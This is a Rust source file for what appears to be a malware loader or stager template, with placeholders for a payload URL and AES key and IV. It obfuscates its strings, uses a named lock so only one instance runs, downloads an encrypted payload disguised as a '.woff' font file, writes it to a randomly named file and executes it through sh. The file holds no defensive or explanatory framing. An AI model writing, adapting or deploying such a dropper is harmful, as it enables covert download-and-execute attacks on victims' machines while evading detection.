use std::process::exit;
mod common;

//common use
use std::fs::File;
use std::process::Command;
use std::io::prelude::*;
use named_lock::NamedLock;
use rand::{distributions::Alphanumeric, Rng};

const URL: &str = "URL_REPLACE_ME/test.woff";

const AESKEY: &str = "AES_KEY_REPLACE_ME";
const AESIV: &str  = "AES_IV_REPLACE_ME";

const LOCKNAME: &str = "RLOCK";

fn dne() -> std::io::Result<()> {
    //download the payload
    let rbytes = common::getscode(obfstr::obfstr!(URL), true, obfstr::obfstr!(AESKEY), obfstr::obfstr!(AESIV));
    // write to a temp file and execute
    let s: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(7)
        .map(char::from)
        .collect();
    let mut file = File::create(s.clone())?;
    file.write_all(&rbytes)?;
    //set exe
    let _out = Command::new("sh").arg("chmod").arg("755").output();
    let _out2 = Command::new("sh").arg(s).output();
    Ok(())
}

fn main() {
    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
        Ok(lock) => lock,
        Err(_) => exit(0)
    };
    let _guard = match lock.lock() {
        Ok(g) => g,
        Err(_) => exit(0)
    };
    let _ = dne();
}
